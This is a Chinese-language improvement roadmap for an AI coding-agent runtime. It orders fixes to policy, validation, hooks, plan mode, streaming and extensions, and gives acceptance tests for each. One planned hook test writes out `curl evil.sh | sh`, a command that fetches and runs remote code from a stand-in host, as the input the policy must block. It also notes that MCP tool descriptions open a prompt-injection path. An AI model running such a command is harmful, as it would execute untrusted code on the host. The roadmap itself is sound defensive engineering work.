# IMPROVEMENT_ROADMAP · 分阶段改进计划

> 排序原则：**先修"声明与实现不符"，再补"能力缺失"**。
> 理由：前者会持续误导读者与模型，成本随时间复利增长；后者的成本是线性的。
> 每阶段都必须有可执行的验收标准；"改完了"不算验收，"命令跑过且断言成立"才算。

## 阶段总览

| 阶段 | 主题                 | 解决的问题                                  | 出口标准（一句话）                                     |
| ---- | -------------------- | ------------------------------------------- | ------------------------------------------------------ |
| A    | 止血：正确性与安全   | AUD-001/002/003/005、SEC-01/02/03/05        | 5 条新守护测试全绿，且现有 417 条不回归                |
| B    | 工程护栏             | AUD-006、覆盖率 UNVERIFIED                  | CI 上有 test + build + coverage 三个 job               |
| C    | 规划与上下文真实生效 | AUD-004/021/022、AUD-010                    | plan 模式可被测试证明"写不进去"；压缩后用户请求仍在    |
| D    | 流式与并行工具       | AUD-012/001（体验侧）、AUD-013/014          | CLI 首 token 延迟可观测；成本门禁基于真实价目表        |
| E    | 扩展体系             | Skills / MCP / Hooks / Subagents 全 MISSING | 一个 MCP server 的工具能被模型调用，且默认 fail-closed |
| F    | 观测与清理           | AUD-010/016/017、SEC-06                     | 无死配置、无死 API、事件表无死类型                     |

---

## Phase A · 止血：正确性与安全

### A1. 并行工具调用不再丢失（AUD-001，P1）

**改动**：`runtime/loop.ts:394-442`。把"取 `toolCalls[0]`"改为遍历全部 `toolCalls`：
每个调用都推一条 `assistant` 的 `tool_use` block（同一条消息内），逐个执行、
逐个回填 `tool_result`（同一条 `user` 消息内）。若需要控制成本，可设上限（如 8 个/轮）
并对超出部分回一条明确的 `is_error` 结果，**不能静默丢弃**。

**验收**：

- 新测试：provider 返回 2 个 `repo.read_file` 调用 → 断言 `tool.started` 事件 2 条、
  磁盘上两次读取都发生、第二轮请求的 messages 里含 2 个 `tool_use` 与 2 个 `tool_result`。
- 回归：`loop.test.ts` 37 条全绿（尤其"工具调用记录会开合"）。

**风险**：Anthropic 要求同一条 assistant 消息里的多个 `tool_use` 对应同一条 user 消息里的
多个 `tool_result`；OpenAI 要求每个 `tool_call_id` 一条独立 `role:"tool"` 消息。
`toAnthropicMessage` / `toOpenAIMessages` 已按此实现，改动集中在循环侧。

### A2. 拒绝上限优雅收场（AUD-002，P1）

**改动**：`policy/engine.ts:187-193`。不再从 `evaluate()` 抛控制流异常；
改为在 `PolicyDecision` 上增加 `effect: "deny"` + `details.abortTask = true`，
或在 `decideByMode` 返回时携带计数，由 `loop.ts` 在 `permissionDenials.length`
达到阈值时走 `finish("failed", "error_during_execution")`。
同时给 `executor.ts:158-159` 的 `decide` 调用加 `try/catch`，把策略异常转成
`failed` 的 `ToolExecutionResult`（保持"执行器不向上抛业务异常"的契约）。

**验收**：

- 修改 `policy.test.ts:714` 那条断言（它当前锁定了缺陷行为）；
- 新测试：连续 20 次拒绝 → 循环终态 `failed`、落库、无未捕获异常；
- 新测试：策略回调抛任意异常 → `executor.execute` 返回 `status: "failed"` 而非抛出。

### A3. 验证流水线接入策略（AUD-003 / SEC-01，P1）

**改动**：`validation/runner.ts:90`。`RunCheckContext` 增加一个
`decide: (req) => Promise<PolicyDecision>`，每次执行前判定：

- `deny` → 记 `blocked`，`summary` 写明命中规则（这正是 `runner.ts:155-159` 预留的分支）；
- `ask` → 在无 TTY 场景同样记 `blocked`，有 TTY 时交回调用方决定（本阶段可先一律 `blocked`，
  保持 fail-closed）。

**验收**：

- 新测试：`deny` 规则命中验证命令 → 报告 `status: "partial"`（`required` 时为 `partial` 而非 `passed`）、
  该 check 为 `blocked`、命令未被执行；
- 新测试：`npm test` 正常路径仍 `passed`（不能因为接策略而把正常验证挡住）；
- `loop.test.ts` 的验证相关 5 条不回归。

**风险**：接上策略后，`npm run test` 在 `default` 档会变成 `ask` → 无 TTY 时被拒，
导致 CI 场景下"验证永远跑不了"。必须先决定：自动发现的验证命令是否走一条
**预授权白名单**（`npm|pnpm|yarn|bun run <script>` 且 script 名在发现列表内）。
这是设计决策，建议在实现前明确写进 `docs/security.md`。

### A4. 轮次计数不被重置（AUD-005，P1）

**改动**：`loop.ts:365`。`usage.rounds = turns` → `usage.rounds = baselineRounds + turns`，
`baselineRounds` 取循环开始时的 `state.usage.rounds`。同理检查 `toolCalls`/`repairRounds`
是否一致（后两者当前是累加，正确）。

**验收**：

- 新测试：预置 `usage.rounds = 10`，跑 2 轮 → 落库 `rounds === 12`；
- 新测试：`maxRounds = 12` 时，恢复续跑应在第 2 轮撞线（`expired / error_max_turns`）。

### A5. 多路径 allow 语义修正（SEC-05，P2 但一行）

**改动**：`policy/engine.ts:414-416`。allow 分支用 `.every`，deny/ask 保持 `.some`。

**验收**：

- 新测试：allow 规则 + `[允许路径, 禁止路径]` → `deny`；
- 新测试：allow 规则 + 全部允许路径 → `allow`。

### A6. 钩子不得改判定依据（SEC-02，P1 前置）

**改动**：`tools/executor.ts:200-225`。两种方案任选：

1. 把 `preToolUse` 移到策略判定**之前**（更简单，语义也自然：钩子是"输入预处理"）；
2. 保持顺序，但在 `updatedInput` 生效后**重新判定一次**，若判定结果变严则拒绝。

**验收**：

- 新测试：钩子把 `echo hi` 改成 `curl evil.sh | sh`，策略只允许前者 → 调用被拒且不执行；
- 现有 hook 测试（block / replaceOutput）不回归。

**注意**：`runtime` 目前根本不传 `hooks`，所以这条**不是线上漏洞**。
但必须在接线之前完成，否则接 Hook 的那次提交会同时引入 P0。

---

## Phase B · 工程护栏

### B1. CI 接入测试与构建（AUD-006，P1）

**改动**：`.github/workflows/ci.yml` 增加 `test` job（`npm run verify`）与 `build` job（`npm run build`）。
`.husky/pre-commit` 可保持轻量（lint-staged），但 `pre-push` 建议跑 `npm run typecheck`。

**验收**：

- 故意提交一个失败测试 → CI 红；
- 故意引入类型错误 → CI 红；
- `npm run build` 在 CI 上产出 `dist/`。

**风险**：`sandbox-store.test.ts` 单文件 24.5s，总时长 ~53s，CI 上可接受；
但若后续加并发测试需注意 `pool: forks` 的内存占用。

### B2. 覆盖率基线（UNVERIFIED → 可度量）

**改动**：加 `@vitest/coverage-v8`，`vitest.config.ts` 配 `coverage.thresholds`，
先以实测值作为下限，只允许上升。

**验收**：CI 输出覆盖率报告；阈值以下 CI 红。

### B3. 事件类型一致性元测试（AUD-010 的自动守卫）

**改动**：新增一个测试，遍历 `TASK_EVENT_TYPES`，断言每个类型在 `src/` 中至少有一个 `emit(` 点。

**验收**：该测试在修好 `retry.api` 之前**应当失败**——这是它的价值。

---

## Phase C · 规划与上下文真实生效

### C1. plan 模式真正生效（AUD-004，P1）

三个子问题必须一起解决，否则修一个还是不通：

1. **工具化进入 plan 模式必须真的摘除写工具**。`runtime.planController().enter()`
   需要调用 `registry.disable(<写工具>)`，或把"当前是否 plan 模式"提升为
   `assemble()` 的输入（推荐后者：状态在 runtime，不在注册表）。
2. **计划必须落盘**。`enter()` 生成的 `planFilePath` 从未被写入。应写入骨架文件
   （含"步骤 id / 目标 / 涉及文件 / doneWhen"模板），让模型有地方写。
3. **计划必须驱动执行**。`exit_plan_mode` 之后应把 `ExecutionPlan` 存进检查点
   （`Checkpoint.plan` 字段已存在但从未赋值），并在 `dynamicContext` 的 `pendingSteps`
   里逐轮注入当前未完成步骤。

**验收**：

- 新测试：`enter_plan_mode` 后 `registry.assemble()` 不含 `repo.write_file` / `command.run`；
- 新测试：`exit_plan_mode` 后检查点的 `plan.steps` 与提交内容一致；
- 新测试：计划提交后第一轮的动态上下文含 `pending-steps:`；
- 修改 `tools.test.ts:1001`（当前用桩 controller，未验证任何约束）。

**设计决策点**：`planController` 用硬编码 `"session"` 作为 taskId（`runtime.ts:246`），
多任务并存时计划会互相覆盖。SDK 场景下这是 bug，建议改成按 taskId 索引。

### C2. 压缩保护正确对象（AUD-022，P2）

**改动**：二选一（推荐第一个）：

1. `loop.ts:338-342` 把动态上下文改为**紧跟 system 之后但仍标记为 system 角色**，
   或把它拼进 system prompt 的末尾（它本来就是动态尾巴，语义上属于 system）；
2. `takeHead` 改为"system + 前 N 条非 tool 的 user 消息"。

**验收**：

- 新测试：按生产顺序构造 `[system, 环境块, 请求, ...]`，压缩后断言请求原文仍在；
- 现有 `context.test.ts` 的 29 条不回归。

### C3. 嵌套 AGENTS.md 加载（AUD-021，P2）

**改动**：`runtime.ts:336` 的 `bundleRules(this.workspaceRoot)` 需要 target 目录。
问题是没有"当前正在编辑的目录"这个概念。最小可行方案：按 `changedFiles` 的公共父目录
在每轮重新收集（成本可控，且有缓存价值）。

**验收**：新测试：`src/AGENTS.md` 存在时，动态上下文/规则提醒里含其内容。

### C4. 事件流补齐（AUD-010，P2）

- `retry.api`：`runtime.ts:158-161` 的 `onRetry` 需要 `sink.emit`，而不只是 `logger.info`。
  这需要把 sink 传进 gateway 回调，或由循环在 `generate` 前后比对 `gateway.usage.retries` 增量补发；
- `task.plan_ready`：C1 完成后自然有 emit 点；
- `agent.message_delta` / `tool.progress`：与 Phase D 的流式一起做，否则没有内容可发。

---

## Phase D · 流式与并行工具

### D1. 流式响应（AUD-012，P1 体验）

**改动**：

- `ModelProvider` 增加可选 `generateStream(input, signal): AsyncIterable<ModelDelta>`；
- `AnthropicProvider` 用 `stream: true` + SSE 解析 `content_block_delta`；
- `OpenAICompatProvider` 解析 `data:` 行，按 `index` 累积 `tool_calls` 分片
  （`accumulateCallFragments` 的注释已经写明了这个坑）；
- `loop.ts` 在流式过程中 `yield sink.emit("agent.message_delta", {...})`；
- `capabilities.streaming` 改为按实现真实填写。

**验收**：

- 新测试：用录制的 SSE fixture 回放，断言 delta 序列、最终 `ModelResponse` 与
  非流式路径**逐字段相等**（这是防止两条路径行为漂移的关键断言）；
- CLI 实测：`--output-format stream-json` 在模型输出过程中就产出 delta 行。

**风险**：这是本路线图中唯一需要改 provider 契约的改动，影响面较大。
建议先加可选方法（不破坏现有 `generate`），再逐步迁移。

### D2. 成本估算真实化（AUD-013，P2）

**改动**：`DEFAULT_PRICING` 改为按模型 id 查表（`model/pricing.ts`），未知模型退回
"按最贵档估算"（fail-safe 到"更早触发预算"，而不是"低估成本"）。

**验收**：新测试：`deepseek-chat` 与 `claude-sonnet` 的 `estimateCost` 不同；
未知模型估算值 ≥ 任一已知模型。

### D3. Retry-After 生效（AUD-014，P2）

**改动**：`classifyHttpError` 把 `Retry-After` 带进 `AppError.details`；
`gateway.generate` 优先使用它，上限 `maxBackoffMs`。

**验收**：新测试：429 + `Retry-After: 3` → `sleep` 收到 3000ms（注入的 sleep 可观测）。

---

## Phase E · 扩展体系

这是工作量最大、也是"对标 Claude Code"差距最明显的一块。**建议顺序：Hooks → MCP → Skills → Subagents**，
理由：Hooks 最小且能验证扩展点的设计；MCP 带来外部工具，必须先解决信任边界；
Skills 是提示词层扩展，依赖上下文装配；Subagents 依赖前面三者的稳定性。

### E1. Hooks（前置：A6）

**改动**：新增 `config/hooks.ts` 解析 `.mod/hooks.json`；`runtime` 构造 `ToolExecutor` 时传入。
Hook 执行必须有超时（默认 5s）与失败策略（pre 失败 → fail-closed 阻断；post 失败 → 忽略）。

**验收**：

- 新测试：pre hook 超时 → 工具调用被阻断且回喂明确错误；
- 新测试：hook 脚本本身崩溃 → 不掀翻循环。

### E2. MCP

**改动**：`mcp/client.ts`（stdio + SSE 传输）、`mcp/bridge.ts`（把 MCP tool 转成 `AgentTool`）。
关键约束：

- 默认 `risk: "external_side_effect"`、`idempotency: "non_idempotent"`（fail-closed）；
- `inputSchema` 是外部 JSON Schema，**不走 Zod**，需要独立校验路径；
- 工具 `description` 进入系统提示词 → 属于新的注入面，必须在提示词里标注"来自外部 server"；
- 连接失败/超时 → 不阻塞启动，`doctor` 里可见。

**验收**：

- 新测试：假 MCP server 提供 1 个工具 → 模型可调用、结果回灌；
- 新测试：server 返回超长工具名 → 显式报错（`registerWithLengthCheck` 已就绪）；
- 新测试：server 未声明 risk → 判定为 `external_side_effect`，`bypassPermissions` 下仍需审批。

### E3. Skills

**改动**：`skills/loader.ts` 扫描 `.mod/skills/*/SKILL.md`，解析 frontmatter（name/description/when），
按需注入（不是全量注入——全量会撑爆上下文）。建议复用 `deferred` + `tool_search` 的思路：
先只给 skill 名与一句话描述，模型主动"激活"后才注入正文。

**验收**：新测试：skill 未激活时正文不在上下文；激活后正文出现且只出现一次。

### E4. Subagents

**改动**：新增 `task.spawn` 工具，用 `AssembleOptions.allowTools/disallowTools`
（已存在）做四层过滤；子任务独立 `taskId` + 独立检查点；`parentCallId` 串联事件
（`TaskEvent.parentCallId` 字段已存在但从未赋值）。

**验收**：

- 新测试：子代理事件流的 `parentCallId` 指向派生它的 `tool_use_id`；
- 新测试：子代理的工具集是父集的真子集。

---

## Phase F · 观测与清理

### F1. 死配置与死 API 清理（AUD-016/017，P2）

两条路，任选但必须选：

- **接上**：`envAllowlist`（传给 `filterEnv`）、`commandMaxTimeoutMs`（clamp `runCommand` 的超时）、
  `gitignorePatterns`（AUD-009）；
- **删掉**：`sandbox.allowedDomains`/`deniedDomains`/`networkMode`（没有网络层，留着是谎言）、
  `AgentTool.checkPermissions`、`Assembly.cacheBreakpoint`、`CommandSegment.hasShellMetachars`、
  `bumpToolCallRetry`。

`Store.transition()` 不是死代码，是**该被接上但没接**（见 Phase A 之后的架构债）。

### F2. 可观测性补齐（P2）

- `approval.blocked_ms`：在 `driveTask` 里用 `metrics.startTimer` 包住 `resolver()` 调用；
- `tool.progress`：长命令（>5s）定期 emit 一次输出增量；
- `doctor` 增加"未覆盖能力"声明（网络出口、文件系统可见性）。

### F3. 安全声明对齐（P2）

把 SECURITY_AUDIT §3 那张表的 6 条偏差逐条处理：能修的修代码，修不了的改文档。
**禁止**保留"文档说做了、代码没做"的状态。

---

## 最值得优先解决的 10 个问题

> **状态：10 条已全部修复**（2026-11-27）。修法、落点与回归用例见
> [CODEBASE_AUDIT.md §7](./CODEBASE_AUDIT.md#_7-修复记录-第一批-最值得优先解决的-10-个问题)。
> 表里的"改动量"是修复前的估算，实际改动集中在 `runtime/loop.ts`、
> `policy/engine.ts`、`tools/executor.ts`、`validation/runner.ts` 四处，
> 新增 17 条回归用例；修复引入的行为变化见该节末尾。

按"修了之后收益最大 / 不修的代价最高"排序。前 4 条建议在同一个 PR 里完成（都是几十行改动）。

| #   | 问题                                     | 为什么排这个位置                                                                                       | 改动量                             |
| --- | ---------------------------------------- | ------------------------------------------------------------------------------------------------------ | ---------------------------------- |
| 1   | **并行工具调用被静默丢弃**（AUD-001）    | 不是性能问题，是正确性问题。多文件任务会少做一半，且模型的操作记录被改写，它会以为自己只请求了一个文件 | 中（循环 + 消息配对）              |
| 2   | **验证流水线绕过策略**（AUD-003）        | 仓库内容 → 任意代码 → 无审查自动执行。这是唯一一条"策略体系外的执行通道"                               | 小（1 处调用点 + 1 个分支）        |
| 3   | **CI 不跑测试**（AUD-006）               | 417 条测试是最大资产，却没有任何门禁。这一条不修，其余所有修复都可能被下一次提交悄悄推翻               | 极小（加 2 个 job）                |
| 4   | **拒绝上限异常穿透**（AUD-002）          | 20 次拒绝后任务死在 `executing`，且异常绕过"错误即数据"的整个设计。现有测试还把缺陷锁成了契约          | 小（改异常为三态 + try/catch）     |
| 5   | **plan 模式是空壳**（AUD-004）           | 工具描述在告诉模型"写工具已不可用"，而它可用。这等于在系统提示词里埋错误信息，模型会基于它做错误决策   | 中（enter/exit/检查点/上下文三处） |
| 6   | **轮次计数被重置**（AUD-005）            | `maxRounds` 是最基本的成本护栏，可被 resume 反复绕过。一行改动                                         | 极小                               |
| 7   | **Hook 可改判定依据**（AUD-007）         | 今天不可利用（未接线），但接 Hooks 是下一阶段必做项。现在不改，接的那天就是 P0                         | 小（顺序调整）                     |
| 8   | **`respectGitignore` 空开关**（AUD-009） | 配置里写着 `true`、文档说它会拦，实际恒为 false。属于"看起来有防护"的典型                              | 极小（传一个参数）                 |
| 9   | **多路径 allow 用 `.some()`**（SEC-05）  | 一行。今天潜伏，加多路径写工具那天变 P0。趁现在没有调用方，改动零风险                                  | 极小                               |
| 10  | **事件表 4 个死类型**（AUD-010）         | 契约是系统对外的承诺。`retry.api` 的注释明确说"恢复时据此判断退避时长"，而它从未被写入事件流           | 小（1 处 emit + 2 个待流式）       |

**为什么"流式响应"没进前 10**：它是体验差异项，不是正确性/安全问题。
在 1–10 修完之前投入流式，等于在会丢工具调用的循环上做动画。

**为什么"扩展体系"没进前 10**：它是 0→1 的能力建设，工作量以周计；
而前 10 条里有 6 条是"一行到几十行"的修复，性价比差两个数量级。
先让现有闭环可靠，再接扩展——否则扩展点会建立在会丢调用、会绕过策略的地基上。
